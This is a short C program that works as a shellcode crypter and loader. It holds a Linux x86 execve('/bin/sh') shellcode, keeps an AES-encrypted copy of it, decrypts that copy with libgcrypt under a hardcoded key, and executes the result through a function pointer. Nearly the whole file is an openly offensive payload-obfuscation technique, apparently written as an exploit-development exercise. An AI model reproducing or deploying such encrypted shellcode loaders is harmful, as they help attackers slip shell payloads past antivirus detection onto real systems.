#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <gcrypt.h>

//Hardcoded password
//const char *key = "iamroot";
const char *key = "iamjboyy";
//Setup IV
uint8_t iniVector[16] = {0x05};
//execve-stack
uint8_t shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80";
//encrypted-execve-stack
uint8_t encryptedshellcode[] = "\x3f\x60\xc7\xf5\xc3\x39\xc8\x42\x7e\x65\xc2\x40\xf3\x5c\xfc\x46\x15\x50\x2b\xc0\x9e\xde\xcf\xa5\xef";


int main(){

    int i, cipher = gcry_cipher_map_name("aes256");
    size_t len = strlen(shellcode);
    uint8_t *decrypt = malloc(len);

    //myCrypt(cipher, len, buffer);
    gcry_cipher_hd_t hd;
    //Open cipher
    gcry_cipher_open(&hd, cipher, GCRY_CIPHER_MODE_OFB, 0);
    //Set key for cipher
    gcry_cipher_setkey(hd, key, 16);
    //Set iv
    gcry_cipher_setiv(hd, iniVector, 16);
    //Decrypt
    gcry_cipher_decrypt(hd, decrypt, len, encryptedshellcode, len);
    
    int (*ret)() = (int(*)())decrypt;
    printf("Running shellcode...\n");
    ret();
	
	gcry_cipher_close(hd);
    free(decrypt);
    return 0;
}
